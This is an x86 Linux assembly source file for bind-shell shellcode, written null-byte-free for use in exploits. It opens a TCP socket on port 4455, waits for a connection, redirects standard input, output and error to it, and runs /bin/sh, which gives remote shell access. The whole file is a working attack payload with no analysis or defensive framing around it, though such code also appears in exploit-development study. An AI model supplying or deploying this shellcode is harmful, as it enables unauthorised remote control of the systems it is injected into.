; Shell Bind TCP - no static addressing or null bytes
; Written By Hussien Yousef

global _start

section .text

_start:
; socket(AF_INET, SOCK_STREAM, 0)

xor eax, eax
mov al, 102
xor ebx, ebx
push ebx
mov bl, 1
push ebx
push 2
mov ecx, esp
int 0x80


; bind(sockfd, *addr, add_len_bytes)
mov edx, eax ; sockfd
xor eax, eax
mov al, 102
xor ebx, ebx
push ebx
mov bl, 2
push word 0x6711
push word 2
mov esi, esp
; args to bind
push 16
push esi
push edx
mov ecx, esp 
int 0x80

; listen(sockfd, backlog)
xor eax, eax
push eax
mov al, 102
inc ebx
inc ebx
push edx
mov ecx, esp
int 0x80

; accept(sockfd, *addr, addr_len)
xor eax, eax
push eax
push eax
mov al, 102
inc ebx
push edx
mov ecx, esp
int 0x80



; dup2(acceptfd, 2)
mov ebx, eax
xor ecx, ecx
mov cl, 2
rotate:
xor eax, eax
mov al, 63
int 0x80
dec ecx
jns rotate

jmp short string_sh
; execve("/bin/sh", null, null)
get_cmd:
xor eax, eax
mov al, 11
pop ebx
xor ecx, ecx
xor edx, edx
int 0x80


string_sh:
call get_cmd
my_path: db "/bin/sh"
